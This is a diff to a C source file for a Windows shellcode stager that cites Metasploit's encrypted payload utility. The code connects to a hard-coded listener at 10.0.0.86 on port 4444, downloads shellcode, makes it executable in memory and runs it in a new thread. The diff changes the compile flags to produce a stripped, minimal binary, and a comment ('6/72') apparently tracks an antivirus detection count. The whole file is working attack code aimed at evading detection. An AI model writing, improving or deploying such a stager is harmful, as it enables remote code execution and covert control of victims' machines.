@@ -6,7 +6,10 @@
  * https://github.com/rapid7/metasploit-framework/tree/master/data/utilities/encrypted_payload
  *
  *
- * x86_64-w64-mingw32-gcc -o stager.exe stager.c -lws2_32
+ * x86_64-w64-mingw32-gcc -nostdlib -nostartfiles -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe
+ * 
+ * // Working flags below, 6/72
+ * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe
  * */
 
 // TODO: eventually convert to c code then asm then shell code?
@@ -30,7 +33,7 @@
 //#pragma comment(lib, "ws2_32.lib")
 
 //bool Stager::run(const std::string& host, const std::string& port)
-bool run(const char* host, const char* port)
+int run(const char* host, const char* port)
 {
     // 1. manually resolve apis (skip for now and just include the headers that import it)
 
@@ -57,7 +60,7 @@ bool run(const char* host, const char* port)
     if (pWSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
         //std::cout << "WSAStartup failed" << std::endl;
         // printf("WSAStartup failed\n");
-        return false;
+        return 1;
     }
 
     SOCKET sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -65,7 +68,7 @@ bool run(const char* host, const char* port)
 	{
         //std::cout << "socket failed: " << WSAGetLastError() << std::endl;
 		// printf("socket failed: %d\n", WSAGetLastError());
-        return false;
+        return 1;
     }
 
     //std::cout << "2 - Socket created" << std::endl;
@@ -86,20 +89,35 @@ bool run(const char* host, const char* port)
 	{
         //std::cout << "getaddrinfo failed" << std::endl;
 		// printf("getaddrinfo failed\n");
-        return false;
+        return 1;
     }
 
     //std::cout << "3 - Address resolved" << std::endl;
     // printf("3 - Address resolved\n");
 
-    bool connected = false;
+    /*
+    int connected = 0;
     for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next) 
 	{
         if (pConnect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0) 
 		{
-            connected = true;
+            connected = 1;
             break;
         }
+    }
+    pFreeAddrInfo(result);
+    */
+
+    int connected = 0;
+    ADDRINFOA *ptr = result; // TODO: no need to assign result to ptr just use result?
+    while (ptr != NULL)
+    {
+        if (pConnect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
+        {
+            connected = 1;
+            break;
+        }
+        ptr = ptr->ai_next;
     }
     pFreeAddrInfo(result);
 
@@ -107,7 +125,7 @@ bool run(const char* host, const char* port)
 	{
         //std::cout << "connect failed" << std::endl;
         // printf("connect failed\n");
-        return false;
+        return 1;
     }
 
     // 2.
@@ -126,7 +144,7 @@ bool run(const char* host, const char* port)
 	{
         //std::cout << "recv failed, received: " << bytes_received << std::endl;
         // printf("recv failed, received: %d\n", bytes_received);
-        return false;
+        return 1;
     }
 
     //std::cout << "5 - Received " << bytes_received << " bytes" << std::endl;
@@ -137,7 +155,7 @@ bool run(const char* host, const char* port)
 	{
         //std::cout << "VirtualAlloc failed: " << GetLastError() << std::endl;
         // printf("VirtualAlloc failed: %d\n", GetLastError());
-        return false;
+        return 1;
     }
 
     // memcpy(beacon_mem, shellcode, bytes_received);
@@ -149,7 +167,8 @@ bool run(const char* host, const char* port)
 
     // EXECUTE_READ.
     DWORD old_prot;
-    if (pVirtualProtect(beacon_mem, bytes_received, PAGE_EXECUTE_READ, &old_prot) == FALSE)
+    // NOTE: virtualProtect is also being called somewhere in the windows api
+    if (pVirtualProtect(beacon_mem, bytes_received, PAGE_EXECUTE_READ, &old_prot) == FALSE) 
     {
         // Fail silently if we cannot make the memory executable.
         return 1;
@@ -165,7 +184,7 @@ bool run(const char* host, const char* port)
 	{
         //std::cout << "CreateThread failed: " << GetLastError() << std::endl;
         // printf("CreateThread failed: %d\n", GetLastError());
-        return false;
+        return 1;
     }
 
     //std::cout << "7 - Thread created, waiting..." << std::endl;
@@ -176,7 +195,7 @@ bool run(const char* host, const char* port)
     // printf("8 - Cleaning up"); 
     pCloseSocket(sock);
     pWSACleanup();
-    return true;
+    return 0;
 }
 
 int main()
@@ -184,6 +203,7 @@ int main()
     //Stager tcpStager;
     //tcpStager.run("172.18.245.234", "4444");
     //tcpStager.run("10.0.0.86", "4444");
+    //run("172.18.245.234", "4444");
     run("10.0.0.86", "4444");
 }
 
